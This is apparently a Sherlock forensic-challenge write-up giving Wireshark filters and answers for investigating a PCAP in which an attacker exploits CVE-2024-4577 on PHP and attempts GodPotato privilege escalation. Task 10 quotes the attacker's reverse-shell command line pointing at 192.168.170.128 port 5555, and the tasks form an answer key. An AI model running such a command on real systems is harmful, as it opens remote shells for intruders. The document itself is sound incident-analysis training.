

----

#### Sherlock Scenario

You are a junior security analyst at a small Japanese cryptocurrency trading company. After detecting suspicious activity on the internal network, you exported a PCAP for further investigation. Analyze this capture to determine whether the environment was compromised and reconstruct the attacker’s actions.



----

Task 1

What is the source IP address of the attacker involved in this Attack?


```
192.168.170.128
```


Search through packet bytes for the "powershell" keyword and we find this suspicious packet
<img width="1889" height="785" alt="image" src="https://github.com/user-attachments/assets/99e7b957-0d72-42b6-b77a-0bfa753195b2" />







Task 2

How many open ports did the attacker discover on the victim's system?


```
8
```



We can use this command to search for signs of port scanning. 
```
ip.src_host ==192.168.170.128  and tcp.flags.reset == 1
```
<img width="1219" height="292" alt="image" src="https://github.com/user-attachments/assets/8d8e85eb-c51a-4170-81c2-42d8519e03bb" />

The tcp flag reset == 1 means to filter for RST packets which most port scanning uses to not finish 3 way handshakes. Not completing a 3 way handshake means faster scanning and more stealth







Task 3

What is the first open port that responded on the victim's system during reconnaissance?


```
22
```


```
ip.addr ==192.168.170.128 and tcp.flags.syn == 1 || tcp.flags.reset == 1
```
<img width="1691" height="834" alt="image" src="https://github.com/user-attachments/assets/eaa11b59-c50b-43f6-9a86-67975d6f65d1" />

We can see the first port to answer with SYN,ACK flags is port 22 indicating it is open







Task 4

What is the CVE identifier for the vulnerability exploited by the attacker?

```
CVE-2024-4577
```



Search for 
```
ip.addr ==192.168.170.128 and http
```
and follow the HTTP stream
<img width="1841" height="819" alt="image" src="https://github.com/user-attachments/assets/0c0153e9-cfe0-4041-8d5f-923b51365834" />




We can see a successful RCE with commands being ran. We can look up the server versions for any CVE's to find how the server got exploited
<img width="1631" height="620" alt="image" src="https://github.com/user-attachments/assets/7b6d2f36-8a19-49c8-9cbd-54be4b15d8c7" />

https://nvd.nist.gov/vuln/detail/cve-2024-4577













Task 5

What is the name and version of the vulnerable product exploited to get RCE?


```
PHP 8.1.25
```
<img width="745" height="359" alt="image" src="https://github.com/user-attachments/assets/ce40c8dd-3d23-464e-a0ea-b4e931a67f7c" />



Attacker used the following CVE to exploit the server
https://nvd.nist.gov/vuln/detail/cve-2024-4577








Task 6

What is the username of the victim account?

```
cristo
```



<img width="866" height="471" alt="image" src="https://github.com/user-attachments/assets/1dee9cb8-3ce3-4f63-a797-909283df8dfc" />










Task 7

At what timestamp did the attacker execute the command to gain their initial foothold on the victim system?


```
2025-01-22 09:47:32
```



Keep following the HTTP stream and you will find a packet containing the reverse shell command in its bytes
```
ip.addr ==192.168.170.128 and http
```
<img width="1837" height="868" alt="image" src="https://github.com/user-attachments/assets/bd1c9657-9523-4795-b222-9806e5f1ff68" />







Task 8

What is the MITRE ATT&CK technique ID used by the attacker to gain an initial foothold


```
T1190
```
The attacker exploited a public facing web app
https://attack.mitre.org/techniques/T1190/










?Task 9

What is the name of the malicious executable the attacker downloaded and executed in memory to facilitate privilege escalation on the endpoint?


```
GodPotato-NET4.exe
```




Filter on the TCP stream between 192.168.170.128 and 192.168.170.130
<img width="1294" height="891" alt="image" src="https://github.com/user-attachments/assets/5fcf66d8-a1ec-4c2d-89ad-12cf9b37be03" />












Task 10

What is the command line used by the attacker while performing privilege escalation?

```
./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```

<img width="958" height="579" alt="image" src="https://github.com/user-attachments/assets/0d5cfefd-28f3-4ea0-9b0d-736f2db58b45" />


















Task 11

The attacker failed to escalate privileges and was given an error. What is the error?

```
Cannot create process Win32Error:2
```

<img width="911" height="649" alt="image" src="https://github.com/user-attachments/assets/f1438791-220c-4ca1-9a88-2050156f81f7" />
